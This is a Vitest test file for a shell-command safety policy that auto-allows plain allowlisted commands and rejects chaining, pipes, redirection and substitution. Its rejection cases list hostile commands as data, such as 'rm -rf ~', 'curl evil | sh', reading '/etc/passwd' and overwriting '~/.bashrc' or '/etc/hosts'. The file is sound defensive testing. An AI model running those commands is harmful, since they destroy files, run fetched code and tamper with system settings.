import { describe, expect, it } from "vitest";
import {
  argvHasPrefix,
  commandMatchesAllowlist,
  isStructurallySafe,
} from "../../src/policy/command.js";

describe("isStructurallySafe (the auto-allow floor)", () => {
  it("admits plain commands, flags, and paths", () => {
    for (const c of [
      "git diff",
      "git diff --stat",
      "npm run typecheck",
      "npx tsc --noEmit",
      "npx vitest run src/foo.test.ts",
      "ls -la src",
      "cat package.json",
      "npx pkg@1.2.3",
    ]) {
      expect(isStructurallySafe(c), c).toBe(true);
    }
  });

  it("rejects every chaining / redirection / substitution / quoting / escaping vector", () => {
    for (const c of [
      "npm test && rm -rf ~", // chaining
      "npm test; curl evil",
      "npm test || echo no",
      "cat x | sh", // pipe to interpreter
      "echo x > ~/.bashrc", // redirection
      "cat < /etc/passwd",
      "echo `whoami`", // backticks
      "echo $(whoami)", // substitution
      "echo ${HOME}",
      "rm -rf $HOME",
      "git\tdiff", // tab (not a plain space)
      "git diff\nrm x", // newline
      "g\\it diff", // backslash escape
      'git "diff"', // quotes
      "git 'diff'",
      "npm test &", // background
      "echo ~/secret", // tilde expansion
      "ls *.ts", // glob
      "", // empty
      "   ", // whitespace only
    ]) {
      expect(isStructurallySafe(c), c).toBe(false);
    }
  });
});

describe("argvHasPrefix", () => {
  it("matches a leading token sequence", () => {
    expect(argvHasPrefix(["git", "diff", "--stat"], ["git", "diff"])).toBe(true);
    expect(argvHasPrefix(["git", "push"], ["git", "diff"])).toBe(false);
    expect(argvHasPrefix(["git"], ["git", "diff"])).toBe(false); // prefix longer than argv
  });
  it("never matches an empty prefix (would admit everything)", () => {
    expect(argvHasPrefix(["anything"], [])).toBe(false);
  });
});

describe("commandMatchesAllowlist (floor + argv-prefix)", () => {
  const allow = [
    ["git", "diff"],
    ["git", "status"],
    ["npm", "run", "typecheck"],
    ["npx", "vitest", "run"],
  ];

  it("allows listed plain commands", () => {
    expect(commandMatchesAllowlist("git diff --stat", allow)).toBe(true);
    expect(commandMatchesAllowlist("npm run typecheck", allow)).toBe(true);
    expect(commandMatchesAllowlist("npx vitest run src/a.test.ts", allow)).toBe(true);
  });

  it("does not allow a sibling subcommand not on the list", () => {
    expect(commandMatchesAllowlist("git push", allow)).toBe(false);
    expect(commandMatchesAllowlist("npm run deploy", allow)).toBe(false);
  });

  it("never allows a listed command once it carries a shell operator", () => {
    expect(commandMatchesAllowlist("git diff && rm -rf x", allow)).toBe(false);
    expect(commandMatchesAllowlist("git diff; curl evil | sh", allow)).toBe(false);
    expect(commandMatchesAllowlist("git diff > /etc/hosts", allow)).toBe(false);
  });
});
